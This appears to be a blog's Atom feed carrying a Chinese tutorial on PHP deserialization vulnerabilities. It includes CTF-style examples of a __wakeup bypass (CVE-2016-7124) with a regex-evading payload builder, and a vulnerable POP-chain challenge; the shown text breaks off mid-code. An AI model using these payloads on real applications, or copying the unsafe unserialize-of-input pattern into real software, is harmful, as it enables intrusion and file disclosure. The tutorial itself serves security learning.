<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>huhuの博客</title>
  
  <subtitle>记录生活中的点点滴滴</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-17T07:34:13.490Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>huhu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>反序列化</title>
    <link href="http://example.com/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-11-17T07:32:32.000Z</published>
    <updated>2021-11-17T07:34:13.490Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h4 id="序列化函数：serialize："><a href="#序列化函数：serialize：" class="headerlink" title="序列化函数：serialize："></a>序列化函数：serialize：</h4><p>​    所有php里面的值都可以使用<strong>函数serialize()来返回一个包含字节流的字符串</strong>来表示。<strong>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;hello admin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> CNSS();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：O:4:”CNSS”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:5:”12345”;}</p><p>下面解释一下其中的一些缩写符号：</p><p>a - array                          b - boolean<br>d - double                        i - integer<br>o - common object          r - reference<br>s - string                          C - custom object<br>O - class                          N - null<br>R - pointer reference       U - unicode string</p><p>所以知道缩写字符的意思后，便可以知道序列化后的内容的意思，同时也可以看出，序列化只保存了对象的属性，并不会保存方法：</p><p>​    O:4:”CNSS”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:5:”12345”;}                                                                                                             对象类型:长度:”类名”:<strong>类中变量的个数</strong>:{类型:长度:”值”;类型:长度:”值”;……}</p><h4 id="反序列化函数：unserialize"><a href="#反序列化函数：unserialize" class="headerlink" title="反序列化函数：unserialize:"></a>反序列化函数：unserialize:</h4><p>​    unserialize() 对单一的<strong>已序列化的变量</strong>进行操作，将其<strong>转换回 PHP 的值</strong>。 <strong>在解序列化一个对象前，这个对象的类必须在解序列化之前定义。</strong>下面看一个师傅举得例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$height</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$height</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;height = <span class="variable">$height</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$man</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出为：</span></span><br><span class="line"><span class="keyword">object</span>(man)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;Bob&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">5</span>)</span><br><span class="line">  [<span class="string">&quot;height&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">20</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但反序列化之后的对象仍可以调用类中的方法，下面是一个师傅的例子：</p><p><img src="https://img-blog.csdnimg.cn/20190814112534807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="PHP反序列化漏洞："><a href="#PHP反序列化漏洞：" class="headerlink" title="PHP反序列化漏洞："></a>PHP反序列化漏洞：</h4><p>在学习反序列化漏洞之前先了解一些常见的<strong>魔法函数</strong>（PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法）：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>   当一个对象创建时被调用，</span><br><span class="line"><span class="selector-tag">__destruct</span>   当一个对象销毁时被调用，</span><br><span class="line"><span class="selector-tag">__toString</span>   当一个对象被当作一个字符串被调用。</span><br><span class="line"><span class="selector-tag">__wakeup</span>()   使用<span class="selector-tag">unserialize</span>时触发，在反序列化之前先调用</span><br><span class="line"><span class="selector-tag">__sleep</span>()    使用<span class="selector-tag">serialize</span>时触发，在序列化之前先调用</span><br><span class="line"><span class="selector-tag">__destruct</span>()    对象被销毁时触发</span><br><span class="line"><span class="selector-tag">__call</span>()    在对象上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="selector-tag">__callStatic</span>()    在静态上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="selector-tag">__get</span>()    用于从不可访问的属性读取数据</span><br><span class="line"><span class="selector-tag">__set</span>()    用于将数据写入不可访问的属性</span><br><span class="line"><span class="selector-tag">__isset</span>()    在不可访问的属性上调用<span class="selector-tag">isset</span>()或<span class="selector-tag">empty</span>()触发</span><br><span class="line"><span class="selector-tag">__unset</span>()     在不可访问的属性上使用<span class="selector-tag">unset</span>()时触发</span><br><span class="line"><span class="selector-tag">__toString</span>()    把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"><span class="selector-tag">__invoke</span>()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>下面引用一片大佬博客里的一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出为：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015211534584.png" alt="image-20211015211534584"></p><h4 id="绕过魔法函数的反序列化："><a href="#绕过魔法函数的反序列化：" class="headerlink" title="绕过魔法函数的反序列化："></a>绕过魔法函数的反序列化：</h4><h5 id="1-wakeup-魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过-wakeup-函数的执行。"><a href="#1-wakeup-魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过-wakeup-函数的执行。" class="headerlink" title="1.wakeup()魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。"></a>1.wakeup()魔法函数绕过：PHP反序列化漏洞<code>CVE-2016-7124</code>——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。</h5><p>如题：</p><p><img src="https://img-blog.csdnimg.cn/20200229173735108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>其实仔细分析代码，只要我们能绕过两点即可得到f15g_1s_here.php的内容</p><p>​    1.绕过正则表达式对变量的检查<br>​    2.绕过_wakeup()魔法函数，因为如果我们反序列化的不是Gu3ss_m3_h2h2.php,这个魔法函数在反序列化时会触发并强制转Gu3ss_m3_h2h2.php</p><p>那么问题就来了，<strong>如何绕过正则表达式/[oc]:\d+:/i，例如：o:4:这样就会被匹配到,而绕过也很简单，只需加上一个+,这个正则表达式即匹配不到0:+4:</strong><br><strong>绕过_wakeup()魔法函数，上面提到了当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 _wakeup 函数的执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#先创建一个对象，自动调用__construct魔法函数</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-test——CVE漏洞："><a href="#2-test——CVE漏洞：" class="headerlink" title="2.test——CVE漏洞："></a>2.test——CVE漏洞：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$height</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$height</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;height = <span class="variable">$height</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hello,this is the test of unserialize&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27; this_is_the_destruct! &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$Man</span> = unserialize(<span class="variable">$man</span>);</span><br><span class="line"><span class="comment">// var_dump($Man);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Man</span> == <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$Man</span>-&gt;printdata();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105171146599.png" alt="image-20211105171146599"></p><p>将其中的一句更改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;<span class="comment">//将3-&gt;4，验证转化后unserialize的结果</span></span><br></pre></td></tr></table></figure><p>得到：<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105172250083.png" alt="image-20211105172250083"></p><p>可以看到<strong>执行了__destruct函数</strong>，说明反序列化了，得到了对象，但是可能不是正常对象，但可以执行对象在销毁时的魔术方法。同时不能执行对应类中的方法和属性值。</p><p>同时看到echo 输出来的结果是  1   ，所以看以看到传入的字符串不能反序列化：<strong>返回false</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function unserialize(string $data [,<span class="built_in"> array </span>$options = []])</span><br><span class="line">从已存储的表示中创建 PHP 的值 unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span><br><span class="line"></span><br><span class="line">Returns:</span><br><span class="line"></span><br><span class="line">返回的是转换之后的值，可为 integer、 float、 string、<span class="built_in"> array </span>或 object。 如果传递的字符串不可反序列化，则返回 false ，并产生一个 E_NOTICE</span><br></pre></td></tr></table></figure><p>再看一个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="literal">false</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105173938151.png" alt="image-20211105173938151"></p><p>即，bool值，为0</p><h4 id="pop链："><a href="#pop链：" class="headerlink" title="pop链："></a>pop链：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//简简单单POP链</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChainSawMan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$toolMan</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;toolMan=<span class="string">&quot;好耶!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Makima</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demon</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;demon=<span class="string">&quot;MeatFeast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;万圣节!万圣节!万圣节!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Power</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$BirthdayCake</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;BirthdayCake=<span class="string">&quot;pwn!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reze</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ChasingFor</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;girl=<span class="string">&quot;bad&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ChasingFor=<span class="string">&quot;ChainSawMan&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 